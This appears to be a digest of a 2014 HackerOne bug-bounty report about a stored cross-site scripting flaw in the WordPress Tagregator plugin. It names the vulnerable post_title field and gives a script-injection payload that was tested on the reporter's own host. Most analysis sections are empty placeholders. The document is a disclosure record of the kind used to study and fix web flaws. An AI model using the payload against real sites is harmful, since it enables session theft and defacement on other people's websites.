# XSS in Tagregator plugin

## Metadata
- **Source:** HackerOne
- **Report:** 35036 | https://hackerone.com/reports/35036
- **Submitted:** 2014-11-09
- **Reporter:** dia2diab
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
This is a XSS in Tagregator plugin that affect on wordpress users
i'm making my test on alwaysdata host
target: http://diaa.alwaysdata.net/wordpress/wp-admin/post-new.php?post_type=tggr-flickr
infected input: post_title
payload: <script>alert("a7a");</script>
then get the Permalink that is generated for public user: http://diaa.alwaysdata.net/wordpress/?tggr-tweets=alerta7a
alerted !!!
 
t

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

This is a XSS in Tagregator plugin that affect on wordpress users
i'm making my test on alwaysdata host
target: http://diaa.alwaysdata.net/wordpress/wp-admin/post-new.php?post_type=tggr-flickr
infected input: post_title
payload: <script>alert("a7a");</script>
then get the Permalink that is generated for public user: http://diaa.alwaysdata.net/wordpress/?tggr-tweets=alerta7a
alerted !!!
 
tell me if you wanna any information
thank you 



</details>

---
*Analysed by Claude on 2026-05-24*
